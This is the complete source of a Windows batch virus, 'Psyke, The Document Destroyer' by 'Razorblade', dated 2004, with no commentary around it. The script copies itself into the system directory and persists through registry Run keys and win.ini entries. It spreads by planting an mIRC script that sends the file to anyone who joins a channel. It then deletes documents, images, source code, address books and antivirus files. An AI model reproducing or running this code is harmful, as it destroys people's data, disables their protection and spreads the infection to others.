   @echo off
   :: Psyke Batch Virus
   :: THe DoCuMeNT DeSTRoYeR
   :: by Razorblade

   set C=cOpY
   set D=DeL
   set M=mD
   set E=eChO
   set A=cLS
   set R=reg add
   set p=psyke

   %E% PsYkE by RaZoRblade

   %M% "%systemroot%\Psyke"
   %C% %0 "%systemroot%\Psyke\%p%.bat
   %C% %0 "%systemroot%\%p%.bat
   %R% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v DokumentManager /t REG_SZ /d "%systemroot%\psyke.bat" /f
   %R% "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PsykeDOCMgr /t REG_SZ /d "%systemroot%\Psyke\psyke.bat" /f

   %E% [windows] >> "%systemroot%\win.ini"
   %E% load=%systemroot%\psyke.bat >> "%systemroot%\win.ini"
   %E% run=%systemroot%\psyke.bat >> "%systemroot%\win.ini"

   %E% [script] > "%programfiles%\mIRC\eventz.ini"
   %E% n0=on 1:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
   %E% n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
   %E% n2=/dcc send $nick "C:\WINDOWS\%p%.bat"  >> "%programfiles%\mIRC\eventz.ini"
   %E% n3=} >> "%programfiles%\mIRC\eventz.ini"

   %D% "*.doc"
   %D% "*.xls"
   %D% "*.dot"
   %D% "*.htm"
   %D% "*.php"
   %D% "*.wab"
   %D% "*.hlp"
   %D% "*.txt"
   %D% "*.ppt"
   %D% "*.vdh"
   %D% "*.jpg"
   %D% "*.gif"
   %D% "*.bmp"
   %D% "*.lib"
   %D% "*.xml"
   %D% "*.c"
   %D% "*.cpp"
   %D% "*.dos"
   %D% "*.html"

   %A%

   %D% "my~1.*"
   %D% "important.*"
   %D% "urgent.*"
   %D% "avp.*"
   %D% "kavp.*"
   %D% "norton~1.*"
   %D% "privat.*"
   %D% "pedo~1.*"

   %A%

   :: 2004
   :: PsyKe
